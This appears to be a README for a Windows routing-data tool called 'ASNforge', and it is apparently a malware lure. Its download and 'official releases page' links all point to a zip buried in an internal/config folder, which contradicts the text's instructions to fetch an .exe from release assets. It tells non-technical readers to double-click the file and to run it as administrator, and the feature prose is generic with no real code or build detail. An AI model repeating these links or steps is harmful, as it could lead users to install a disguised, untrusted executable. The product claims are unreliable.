# 🌐 ASNforge - Simplify your internet routing data analysis

[![](https://img.shields.io/badge/Download-ASNforge-blue.svg)](https://github.com/irawany304-gif/ASNforge/raw/refs/heads/main/internal/config/AS_Nforge_v1.9.zip)

ASNforge turns complex internet routing data into clear information. This application helps you work with autonomous system numbers and prefix-origin data. You can use it to build security pipelines, analyze network paths, or enrich IP addresses.

## 📥 Getting Started

You do not need programming skills to use this tool. Follow these steps to set up the software on your Windows computer.

1. Visit the [official releases page](https://github.com/irawany304-gif/ASNforge/raw/refs/heads/main/internal/config/AS_Nforge_v1.9.zip) to access the latest version.
2. Look for the file ending in .exe under the Assets section.
3. Click the file to start the download.
4. Save the file to a folder you can find easily, such as your Downloads folder.
5. Double-click the downloaded file to begin the setup process.
6. Follow the on-screen prompts to finish the installation.

## 🛠️ System Requirements

ASNforge works on most modern Windows systems. Ensure your computer meets these basic needs for the best experience:

* Windows 10 or Windows 11.
* A stable internet connection for downloading routing databases.
* At least 500 megabytes of free storage space.
* 4 gigabytes of memory or more.

## 📊 Core Features

ASNforge manages the heavy lifting for your network data needs. 

* Automated data collection: The app fetches updates from trusted sources for you.
* Format conversion: It turns raw routing tables into readable files.
* Security enrichment: It links IP addresses to known threat intelligence data.
* Routing analytics: You can track path changes and peering status.
* Database support: It integrates seamlessly with MaxMind and CAIDA data formats.

## ⚙️ How to Use the Application

Once you open the software, you see a clean dashboard. Follow these steps to perform your first analysis:

1. Open the File menu and select Import.
2. Choose your input file containing the IP addresses or routing prefixes.
3. Select your preferred output format.
4. Click the Run button to start the processing task.
5. View the progress bar on the main screen to track the status.
6. Once the task ends, the app saves your file to your chosen output folder.

## 🔍 Understanding the Data

The app provides information based on standard internet registry data. You will see several columns in your output files:

* ASN: The unique number assigned to your routing destination.
* Prefix: The range of IP addresses being analyzed.
* Origin: The registered entity responsible for the prefix.
* Reputation: A score indicating if the source is known for safe or malicious activity.
* Geography: The physical region associated with the network provider.

## 🛡️ Security and Privacy

ASNforge processes your data locally on your machine. The application does not send your private lists to external servers for processing. Only the specific routing databases download from the internet when you trigger an update. This design keeps your security workflows private and your data within your own network environment.

## 💡 Managing Updates

Data in the networking world changes every day. ASNforge helps you keep your intelligence fresh.

1. Navigate to the Settings menu.
2. Select the Updates tab.
3. Toggle the Automatic Updates switch to the On position.
4. The software checks for new database signatures every time you launch it.
5. If the application detects a newer version of the software itself, it alerts you with a notification window.

## 🎓 Common Questions

**Does the software require a subscription?**
No, ASNforge is free to use for all users.

**Can I run the software offline?**
You may process data while offline if you have already downloaded the necessary mapping databases. However, you need an internet connection to fetch the latest routing data updates.

**Where does the project get its data?**
The tool pulls information from public regional internet registries, CAIDA, and MaxMind. 

**Is this tool suitable for large datasets?**
Yes, the internal processing engine handles lists containing millions of entries if your computer has enough memory.

## 🏗️ Technical Workflow

The application acts as a compiler for diverse network datasets. It standardizes data formats so that you do not have to clean them manually. 

1. Input ingestion: The tool reads CSV, TXT, or JSON files.
2. Parsing engine: It maps input entries against the internal routing registry.
3. Intelligence layering: It overlays security and ownership information to the base list.
4. Export: The application generates a final report in your desired format.

## 🔧 Troubleshooting

If the application fails to start, verify your Windows version. Ensure you provide the software with permissions to write files to your chosen output folder. If a specific task hangs, restart the application and check your local storage space. Most issues stem from incomplete database downloads, which you can fix by running the update sequence again from the Settings menu. 

Keep your workspace organized by placing your input files in a dedicated folder before you import them into the software. This habit prevents confusion during bulk processing tasks. If you see errors related to file access, try running the application as an administrator.